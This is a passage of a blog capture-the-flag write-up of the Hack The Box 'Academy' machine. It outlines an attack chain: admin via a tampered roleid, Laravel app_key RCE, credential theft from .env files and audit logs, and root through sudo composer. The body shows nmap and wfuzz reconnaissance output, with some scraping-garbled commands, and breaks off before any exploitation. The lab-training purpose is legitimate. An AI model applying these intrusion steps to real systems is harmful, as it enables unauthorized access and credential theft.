<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script type="text/javascript" src="../scripts/lightbox/lightbox.js"></script><link rel="stylesheet" href="../scripts/lightbox/lightbox.css"> <script src="../sdks/onesignalsdk.js" async=""></script> <script> var OneSignal = window.OneSignal || []; OneSignal.push(function() { OneSignal.init({ appId: "7174cacd-26ac-4796-aa89-4928af4847f1", }); }); </script><link rel="shortcut icon" href="../assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="../assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="../assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="../assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="../assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="../assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" ><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" ><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" ><link rel="dns-prefetch" href="https://www.googletagmanager.com"><meta name="description" content="Altering the administrator username by changing the roleid and login as admin on the web , two ways to get user one is admin page revealing a new VHOST which is running on laravel , and the lavarel is exposing its app_key so its is vulnerable to RCE , Exploiting the RCE and get a shell as www-data . and second is reading the .env file and get the password for the user from academy dir , Hit and trial that password on all **console** users , got lucky with one user .And second is reading the `.env` file and get the password for the user from **academy** dir and login with onw of the user metioned on `admin` page. Now got `mrb3n` user password from **audit-logs** and logged in as **mrb3n**. mrb3n can run `composer` as **sudo** , making a custom script and running it with `composer` as `root`, Thats how i pwned it" /><meta property="og:title" content="Hackthebox Academy writeup" /><meta property="og:description" content="Altering the administrator username by changing the roleid and login as admin on the web , two ways to get user one is admin page revealing a new VHOST which is running on laravel , and the lavarel is exposing its app_key so its is vulnerable to RCE , Exploiting the RCE and get a shell as www-data . and second is reading the .env file and get the password for the user from academy dir , Hit and trial that password on all **console** users , got lucky with one user .And second is reading the `.env` file and get the password for the user from **academy** dir and login with onw of the user metioned on `admin` page. Now got `mrb3n` user password from **audit-logs** and logged in as **mrb3n**. mrb3n can run `composer` as **sudo** , making a custom script and running it with `composer` as `root`, Thats how i pwned it" /><meta property="og:image" content="https://Mohammadaassif.github.io../hackthebox/academy/academy.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@Mohammadaassif"><meta property="twitter:title" content="Hackthebox Academy writeup"><meta name="twitter:creator" content="@Mohammadaassif"><meta name="twitter:description" content="Altering the administrator username by changing the roleid and login as admin on the web , two ways to get user one is admin page revealing a new VHOST which is running on laravel , and the lavarel is exposing its app_key so its is vulnerable to RCE , Exploiting the RCE and get a shell as www-data . and second is reading the .env file and get the password for the user from academy dir , Hit and trial that password on all **console** users , got lucky with one user .And second is reading the `.env` file and get the password for the user from **academy** dir and login with onw of the user metioned on `admin` page. Now got `mrb3n` user password from **audit-logs** and logged in as **mrb3n**. mrb3n can run `composer` as **sudo** , making a custom script and running it with `composer` as `root`, Thats how i pwned it"><meta name="twitter:image" content="https://Mohammadaassif.github.io../hackthebox/academy/academy.png"><title>Hackthebox Academy writeup | Mohammadaassif</title><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="../npm/bootstrap_4.0.0/dist/css/bootstrap.min.css" ><link rel="stylesheet" href="../npm/_fortawesome/fontawesome-free_5.11.2/css/all.min.css" ><link rel="preload" as="style" href="../assets/css/post.css"><link rel="stylesheet" href="../assets/css/post.css"><link rel="preload" as="style" href="../assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="../assets/css/lib/bootstrap-toc.min.css" /> <script src="../npm/jquery_3/dist/jquery.min.js"></script> <script async src="../combine/npm/popper_js_1.15.0_npm/bootstrap_4/dist/js/bootstrap.min.js"></script> <script async src="../assets/js/post.min.js"></script> <script defer src="../app.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="../index.html" alt="avatar"> <img src="../assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="../index.html">Mohammadaassif</a></div><div class="site-subtitle font-italic">InfoSec/Cybersec Blog And Writeups</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="../index.html" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="../tabs/support.html" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-clock ml-xl-3 mr-xl-3 unloaded"></i> <span>SUPPORT ME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="../tabs/categories.html" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="../tabs/tags.html" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="../tabs/archives.html" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="../tabs/about.html" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.hackthebox.eu/home/users/profile/84820" target="_blank"></i> <i class="fas fa-cube"></i> </a> <a href="https://github.com/Mohammadaassif" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://discordapp.com/users/476931503981592607" target="_blank"> <i class="fab fa-discord"></i> </a> <a href="https://twitter.com/Mohammadaassif" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/prashant-saini-8a7a1a162" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="../index.html"> Posts </a> </span> <span>Hackthebox Academy writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Academy writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Nov 9, 2020, 12:00 AM +0800" > Nov 9, 2020 <i class="unloaded">2020-11-09T00:00:00+08:00</i> </span> by <span class="author"> Prashant Saini </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="../hackthebox/academy/academy.png" class="post-preview-img"><h1 id="introductionacademy">Introduction@Academy:~$</h1><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Name<td>Academy<tr><td>IP<td>10.10.10.215<tr><td>Points<td>20<tr><td>Os<td>Linux<tr><td>Difficulty<td>Easy<tr><td>Creator<td><a href="https://www.hackthebox.eu/home/users/profile/1190" target="_blank">egre55</a> & <a href="https://www.hackthebox.eu/home/users/profile/2984" target="_blank">Mrb3n</a><tr><td>Out On<td>07 NOV 2020</table></div><h1 id="briefacademy">Brief@Academy:~$</h1><p>Altering the <code class="language-plaintext highlighter-rouge">administrator</code> username by changing the <strong>roleid</strong> and login as <code class="language-plaintext highlighter-rouge">admin</code> on the web , two ways to get user one is admin page revealing a new <code class="language-plaintext highlighter-rouge">VHOST</code> which is running on <strong>laravel</strong> , and the lavarel is exposing its <code class="language-plaintext highlighter-rouge">app_key</code> so its is vulnerable to <strong>RCE</strong> , Exploiting the <strong>RCE</strong> and get a shell as <code class="language-plaintext highlighter-rouge">www-data</code> . and second is reading the <code class="language-plaintext highlighter-rouge">.env</code> file and get the password for the user from <strong>academy</strong> dir , Hit and trial that password on all <strong>console</strong> users , got lucky with one user .And second is reading the <code class="language-plaintext highlighter-rouge">.env</code> file and get the password for the user from <strong>academy</strong> dir and login with onw of the user metioned on <code class="language-plaintext highlighter-rouge">admin</code> page. Now got <code class="language-plaintext highlighter-rouge">mrb3n</code> user password from <strong>audit-logs</strong> and logged in as <strong>mrb3n</strong>. mrb3n can run <code class="language-plaintext highlighter-rouge">composer</code> as <strong>sudo</strong> , making a custom script and running it with <code class="language-plaintext highlighter-rouge">composer</code> as <code class="language-plaintext highlighter-rouge">root</code>, Thats how i pwned it .</p><h1 id="summary">Summary:~</h1><ul><li><code class="language-plaintext highlighter-rouge">Registering</code> and login as regular <strong>user</strong><li>Testing the <code class="language-plaintext highlighter-rouge">admin.php</code><li>Changing the <strong>roleid</strong> to <code class="language-plaintext highlighter-rouge">1</code><li>Login as admin on <strong>login.php</strong><li>Registering as <code class="language-plaintext highlighter-rouge">administrator</code> and chnaging the <strong>rolid</strong><li>Login to <strong>admin.php</strong><li>First way to get <code class="language-plaintext highlighter-rouge">user</code><li>Got a new <code class="language-plaintext highlighter-rouge">vhost</code> <strong>dev-staging-01.academy.htb</strong><li>Got two <strong>usernames</strong><li>Got some <code class="language-plaintext highlighter-rouge">sensitive</code> information on the <code class="language-plaintext highlighter-rouge">vhost</code><li>RCE on the <strong>vhost</strong> running <strong>laravel</strong><li>shell as <code class="language-plaintext highlighter-rouge">www-data</code><li>Got the <strong>.env</strong> file which contains a <strong>password</strong><li>Login as <code class="language-plaintext highlighter-rouge">cry0l1t3</code><li>second way to get user<li>Fuzzing the <code class="language-plaintext highlighter-rouge">host</code> and got new dir <strong>academy</strong><li>Running on <code class="language-plaintext highlighter-rouge">laravel</code> so it had a <strong>.env</strong> file<li>got password and login as <strong>cry0l1t3</strong><li>Got <code class="language-plaintext highlighter-rouge">user.txt</code><li>The user is in <strong>adm</strong> group so he can read logs<li>Got <code class="language-plaintext highlighter-rouge">mrb3n</code> password from <strong>audit.log.3</strong><li>LOgin as mrb3n<li><code class="language-plaintext highlighter-rouge">mrb3n</code> can run <strong>composer</strong> as root<li>Run custom scripts using <strong>composer</strong> and got root shell<li>Got root.txt</ul><h1 id="pwned">Pwned</h1><html><head><link rel="stylesheet" type="text/css" href="../asciinema-player.css" /><body> <asciinema-player src="/hackthebox/academy/academy.cast" start-at="0" autoplay="1" speed="2" loop="1" cols="150" rows="20"></asciinema-player> <script src="../asciinema-player.js"></script><h2 id="nmap">Nmap</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.80 scan initiated Wed Nov 11 19:43:49 2020 as: nmap -sC -sV -p- -T4 -oA scans/nmap.full academy.htb</span>
Warning: 10.10.10.215 giving up on port because retransmission cap hit <span class="o">(</span>6<span class="o">)</span><span class="nb">.</span>
Nmap scan report <span class="k">for </span>academy.htb <span class="o">(</span>10.10.10.215<span class="o">)</span>
Host is up <span class="o">(</span>0.43s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65518 closed ports
PORT      STATE    SERVICE    VERSION
22/tcp    open     ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp    open     http       Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Hack The Box Academy
1250/tcp  filtered swldy-sias
2153/tcp  filtered ctlptc
14467/tcp filtered unknown
22370/tcp filtered hpnpd
25535/tcp filtered unknown
32233/tcp filtered unknown
33060/tcp open     mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message
|_    HY000
38923/tcp filtered unknown
41033/tcp filtered unknown
43337/tcp filtered unknown
47198/tcp filtered unknown
49543/tcp filtered unknown
53965/tcp filtered unknown
62626/tcp filtered unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>11/11%Time<span class="o">=</span>5FABF888%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>
SF:NULL,9,<span class="s2">"</span><span class="se">\x</span><span class="s2">05</span><span class="se">\0\0\0\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\0</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>GenericLines,9,<span class="s2">"</span><span class="se">\x</span><span class="s2">05</span><span class="se">\0\0\0\x</span><span class="s2">0b
SF:</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\0</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,9,<span class="s2">"</span><span class="se">\x</span><span class="s2">05</span><span class="se">\0\0\0\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\0</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>HTTPO
SF:ptions,9,<span class="s2">"</span><span class="se">\x</span><span class="s2">05</span><span class="se">\0\0\0\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\0</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,9,<span class="s2">"</span><span class="se">\x</span><span class="s2">05</span><span class="se">\0\0\0\x</span><span class="s2">0
SF:b</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\0</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>RPCCheck,9,<span class="s2">"</span><span class="se">\x</span><span class="s2">05</span><span class="se">\0\0\0\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\0</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>DNSVer
SF:sionBindReqTCP,9,<span class="s2">"</span><span class="se">\x</span><span class="s2">05</span><span class="se">\0\0\0\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\0</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>DNSStatusRequestTCP,
SF:2B,<span class="s2">"</span><span class="se">\x</span><span class="s2">05</span><span class="se">\0\0\0\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\0\x</span><span class="s2">1e</span><span class="se">\0\0\0\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">88'</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\x</span><span class="s2">0f
SF:Invalid</span><span class="se">\x</span><span class="s2">20message</span><span class="se">\"\x</span><span class="s2">05HY000"</span><span class="o">)</span>%r<span class="o">(</span>Help,9,<span class="s2">"</span><span class="se">\x</span><span class="s2">05</span><span class="se">\0\0\0\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\0</span><span class="s2">"</span>
SF:<span class="o">)</span>%r<span class="o">(</span>SSLSessionReq,2B,<span class="s2">"</span><span class="se">\x</span><span class="s2">05</span><span class="se">\0\0\0\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\0\x</span><span class="s2">1e</span><span class="se">\0\0\0\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">0
SF:1</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">88'</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\x</span><span class="s2">0fInvalid</span><span class="se">\x</span><span class="s2">20message</span><span class="se">\"\x</span><span class="s2">05HY000"</span><span class="o">)</span>%r<span class="o">(</span>TerminalServerCooki
SF:e,9,<span class="s2">"</span><span class="se">\x</span><span class="s2">05</span><span class="se">\0\0\0\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\0</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>TLSSessionReq,2B,<span class="s2">"</span><span class="se">\x</span><span class="s2">05</span><span class="se">\0\0\0\x</span><span class="s2">0b</span><span class="se">\</span><span class="s2">
SF:x08</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\0\x</span><span class="s2">1e</span><span class="se">\0\0\0\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">88'</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\x</span><span class="s2">0fInvalid</span><span class="se">\x</span><span class="s2">20message</span><span class="se">\</span><span class="s2">
SF:"</span><span class="se">\x</span>05HY000<span class="s2">")%r(Kerberos,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(SMBProgNeg,
SF:9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(X11Probe,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05
SF:<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20message\"\x05HY
SF:000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20message<span class="se">\"</span>
SF:<span class="se">\x</span>05HY000<span class="s2">")%r(LDAPBindReq,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(SIPOption
SF:s,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(LANDesk-RC,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\</span>
SF:x05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(TerminalServer,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(NCP,9,
SF:"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(NotesRPC,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>
SF:1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20message\"\x05HY00
SF:0")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05\0\
SF:0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%
SF:r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20message<span class="se">\"</span>
SF:<span class="se">\x</span>05HY000<span class="s2">")%r(giop,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov 11 20:14:19 2020 -- 1 IP address (1 host up) scanned in 1830.04 seconds
</span></pre></table></code></div></div><p>Only three ports <code class="language-plaintext highlighter-rouge">22:ssh</code> <code class="language-plaintext highlighter-rouge">80:http</code> and <code class="language-plaintext highlighter-rouge">33060:mysql</code></p><h1 id="port-80">Port 80</h1><p>There is a decent web app hosted</p><p><a href="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/image-1.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/image-1.png" alt="" /></a></p><p>There is a login page and a register page as well</p><h2 id="fuzzing-for-files">Fuzzing for files</h2><p>I tried fuzzing the files with <code class="language-plaintext highlighter-rouge">php,txt</code> extension to check if there any hidden file available</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>root at Mohammadaassif <span class="k">in</span> /home/Mohammadaassif/hackthebox/machines/academy 
<span class="nv">$ </span>wfuzz <span class="nt">-u</span> http://academy.htb/FUZZ.FUZ2Z <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">--hc</span> 404 <span class="nt">-z</span> list,php-txt <span class="nt">--hh</span> 2117
Warning: <span class="nv">Pyctarget</span><span class="o">=</span><span class="s2">"_blank"</span> is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzzs documentation <span class="k">for </span>more information.
<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 2.4.5 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>
Target: http://academy.htb/FUZZ.FUZ2Z
Total requests: 441120
<span class="o">===================================================================</span>
ID           Response   Lines    Word     Chars       Payload                                                                                                                                           
<span class="o">===================================================================</span>
000000027:   403        9 L      28 W     276 Ch      <span class="s2">"php"</span>                                                  
000000075:   302        1062 L   4166 W   57059 Ch    <span class="s2">"home - php"</span>                                         
000000105:   200        141 L    226 W    2627 Ch     <span class="s2">"login - php"</span>                                         
000000129:   200        148 L    247 W    3003 Ch     <span class="s2">"register - php"</span>                                         
000000517:   200        141 L    227 W    2633 Ch     <span class="s2">"admin - php"</span>
000002979:   200        0 L      0 W      0 Ch        <span class="s2">"config - php"</span>  
</pre></table></code></div></div><p>These are some files that i got <code class="language-plaintext highlighter-rouge">config.php</code> contains nothing</p><blockquote><p>config.php</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>root at Mohammadaassif <span class="k">in</span> /home/Mohammadaassif 
<span class="nv">$ ctarget</span><span class="o">=</span><span class="s2">"_blank"</span> http://academy.htb/config.php
</pre></table></code></div></div><blockquote><p>admin.php</p></blockquote><p><a href="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/image-2.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/image-2.png" alt="" /></a></p><p>Nothing just the basic login page , tried some basic <code class="language-plaintext highlighter-rouge">sqli</code> but no success</p><blockquote><p>login.php</p></blockquote><p><a href="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/image-3.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/image-3.png" alt="" /></a></p><p>Its also same as <code class="language-plaintext highlighter-rouge">admin.php</code></p><blockquote><p>register.php</p></blockquote><p><a href="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/image-4.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/image-4.png" alt="" /></a></p><p>Its a registeration page , which is asking for <code class="language-plaintext highlighter-rouge">username</code> , <code class="language-plaintext highlighter-rouge">email</code> , <code class="language-plaintext highlighter-rouge">password</code></p><p>I registered myself and logged in as <code class="language-plaintext highlighter-rouge">Mohammadaassif</code></p><p>and i was taken to <code class="language-plaintext highlighter-rouge">success-page.php</code> if i am a valid registeration <a href="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/image-5.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/image-5.png" alt="" /></a></p><p>And after logging in i am able to access the <code class="language-plaintext highlighter-rouge">dashboard</code></p><p><a href="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/image-6.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/image-6.png" alt="" /></a></p><p>It looks the machine <code class="language-plaintext highlighter-rouge">swagshop</code> from where hackthebox started his 